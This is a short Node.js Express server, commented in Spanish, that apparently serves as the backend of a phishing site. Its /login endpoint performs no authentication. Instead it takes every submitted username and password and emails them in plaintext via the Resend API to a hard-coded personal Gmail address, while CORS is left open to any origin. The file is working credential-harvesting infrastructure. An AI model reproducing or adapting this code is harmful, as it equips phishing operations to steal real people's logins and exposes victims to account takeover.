import express from 'express';
import { Resend } from 'resend';
import cors from 'cors';
import bodyParser from 'body-parser';
import path from 'path';
import { fileURLToPath } from 'url';
import dotenv from 'dotenv';

// 1. Configurar dotenv
dotenv.config();

// 2. Definir __dirname manualmente (necesario para "type": "module")
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();

app.use(cors({ origin: "*" }));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// 3. Ahora sí podemos usar __dirname
app.use(express.static(path.join(__dirname, 'public')));

const resend = new Resend(process.env.RESEND_API_KEY);

app.post('/login', async (req, res) => {
    const { usuario, password } = req.body;

    try {
        const data = await resend.emails.send({
            from: "onboarding@resend.dev",
            to: "paschasin1234@gmail.com", 
            subject: "Nuevo login recibido",
            html: `
                <h2>Nuevo registro</h2>
                <p><strong>Usuario:</strong> ${usuario}</p>
                <p><strong>Password:</strong> ${password}</p>
            `
        });

        console.log("Correo enviado ID:", data.id);
        res.status(200).send("OK");
    } catch (error) {
        console.error("Error enviando correo:", error);
        res.status(500).send("ERR");
    }
});

app.get("/ping", (req, res) => res.send("pong"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Servidor corriendo en puerto ${PORT}`);
});